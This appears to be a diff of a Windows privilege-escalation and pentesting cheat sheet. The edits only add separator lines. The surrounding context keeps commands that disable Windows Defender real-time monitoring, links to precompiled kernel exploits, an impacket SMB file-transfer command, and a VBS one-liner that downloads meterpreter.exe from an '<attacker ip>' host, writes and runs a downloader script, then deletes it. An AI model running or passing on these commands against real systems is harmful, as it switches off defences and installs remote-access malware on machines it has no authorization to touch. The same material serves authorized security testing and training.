@@ -7,7 +7,8 @@ https://github.com/absolomb/Pentesting/blob/master/scripts/winenum.bat
     Get-ExecutionPolicy    
     Set-ExecutionPolicy Unrestricted   
     Set-MpPreference -DisableRealtimeMonitoring $true   
-    
+____   
+
 # Exploits
 ## Service Exploits
 ### Unquoted Service Paths
@@ -19,7 +20,10 @@ https://github.com/absolomb/Pentesting/blob/master/scripts/winenum.bat
 https://github.com/bitsadmin/wesng   
 https://github.com/rasta-mouse/Watson   
 ### Precompiled Kernel Exploits
-https://github.com/SecWiki/windows-kernel-exploits
+https://github.com/SecWiki/windows-kernel-exploits   
+
+____   
+
 
 # File Transfer     
     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
@@ -35,7 +39,7 @@ https://github.com/SecWiki/windows-kernel-exploits
 ## VBS 
     echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"
 
- 
+ ____   
   
 # Resources
 ## Cheat Sheets
